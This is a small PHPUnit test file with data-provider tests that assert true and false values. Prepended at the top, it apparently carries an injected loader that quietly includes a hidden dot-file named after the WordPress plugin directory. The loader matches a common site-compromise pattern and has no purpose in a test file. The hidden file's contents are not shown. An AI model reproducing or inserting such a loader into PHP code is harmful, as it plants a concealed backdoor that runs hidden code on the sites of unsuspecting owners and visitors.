<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DataProviderFilterTest extends PHPUnit_Framework_TestCase
{
    /**
     * @dataProvider truthProvider
     */
    public function testTrue($truth)
    {
        $this->assertTrue($truth);
    }

    public static function truthProvider()
    {
        return array(
           array(true),
           array(true),
           array(true),
           array(true)
        );
    }

    /**
     * @dataProvider falseProvider
     */
    public function testFalse($false)
    {
        $this->assertFalse($false);
    }

    public static function falseProvider()
    {
        return array(
          'false test'       => array(false),
          'false test 2'     => array(false),
          'other false test' => array(false),
          'other false test2'=> array(false)
        );
    }
}
